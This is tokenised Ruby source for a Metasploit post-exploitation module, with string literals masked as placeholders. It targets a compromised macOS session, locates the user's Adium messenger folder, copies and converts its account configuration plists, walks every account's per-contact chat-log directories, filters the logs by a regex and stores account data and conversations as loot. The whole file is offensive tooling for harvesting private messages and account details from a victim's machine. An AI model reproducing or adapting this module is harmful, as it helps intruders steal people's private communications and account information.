require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: File include Msf :: Auxiliary :: Report def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , { <str> = > <str> } ] , [ <str> , { <str> = > <str> } ] , [ <str> , { <str> = > <str> } ] ] , <str> = > <str> ) ) register_options ( [ OptRegexp . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def plutil ( filename ) exec ( <str> filename <str> ) data = exec ( <str> filename <str> ) return data end def get_chatlogs ( base ) base = <str> base <str> print_status ( <str> @peer <str> ) targets = [ ] dir ( base ) . each do | account | dir ( <str> base <str> account <str> ) . each do | contact | base_path = <str> base <str> account <str> contact <str> logs = exec ( <str> base_path <str> ) . split ( <str> ) next if logs =~ <str> filtered_logs = [ ] logs . each do | log | if log =~ datastore [ <str> ] vprint_status ( <str> log <str> ) filtered_logs << log end end targets << { <str> = > account , <str> = > contact , <str> = > filtered_logs } end end logs = [ ] targets . each do | target | log_size = target [ <str> ] . length contact = target [ <str> ] account = target [ <str> ] next if log_size == <int> print_status ( <str> @peer <str> log_size . to_s <str> contact <str> account <str> ) target [ <str> ] . each do | log | log = <str> log <str> data = exec ( <str> log <str> ) logs << { <str> = > account , <str> = > contact , <str> = > data } end end return logs end def get_account_info ( base ) files = [ <str> , <str> , <str> ] loot = [ ] files . each do | file | fpath = <str> base <str> file <str> rand_name = <str> Rex :: Text . rand_text_alpha ( <int> ) <str> tmp = exec ( <str> fpath <str> rand_name <str> ) if tmp =~ <str> print_error ( <str> @peer <str> fpath <str> ) next end print_status ( <str> @peer <str> file <str> ) xml = plutil ( rand_name ) if xml . empty? print_error ( <str> @peer <str> file <str> ) else loot << { <str> = > file , <str> = > xml } exec ( <str> rand_name <str> ) end end return loot end def save ( type , data ) case type when <str> data . each do | e | e [ <str> ] = e [ <str> ] . gsub ( <str> , <str> ) p = store_loot ( <str> , <str> , session , e [ <str> ] , e [ <str> ] ) print_good ( <str> @peer <str> e [ <str> ] <str> p <str> ) end when <str> data . each do | e | account = e [ <str> ] contact = e [ <str> ] data = e [ <str> ] p = store_loot ( <str> , <str> , session , data , contact ) print_good ( <str> @peer <str> contact <str> account <str> p <str> ) end end end def whoami exec ( <str> ) end def dir ( path ) subdirs = exec ( <str> path <str> ) return [ ] if subdirs =~ <str> items = subdirs . scan ( <str> ) . flatten return items end def exec ( cmd ) begin out = cmd_exec ( cmd ) . chomp rescue :: Timeout :: Error = > e vprint_error ( <str> @peer <str> e . message <str> ) retry rescue EOFError = > e vprint_error ( <str> @peer <str> e . message <str> ) retry end end def locate_adium ( base ) dir ( base ) . each do | folder | m = folder . match ( <str> ) if m m = m [ <int> ] . gsub ( <str> , <str> ) + <str> return <str> base <str> m <str> end end return nil end def run if action . nil? print_error ( <str> ) return end @peer = <str> session . session_host <str> session . session_port <str> user = whoami base = <str> user <str> adium_path = locate_adium ( base ) if adium_path print_status ( <str> @peer <str> adium_path <str> ) adium_path += <str> else print_error ( <str> @peer <str> ) return end account_data = get_account_info ( adium_path ) if action . name =~ <str> chatlogs = get_chatlogs ( adium_path ) if action . name =~ <str> save ( <str> , account_data ) if not account_data . nil? and not account_data . empty? save ( <str> , chatlogs ) if not chatlogs . nil? and not chatlogs . empty? end end 
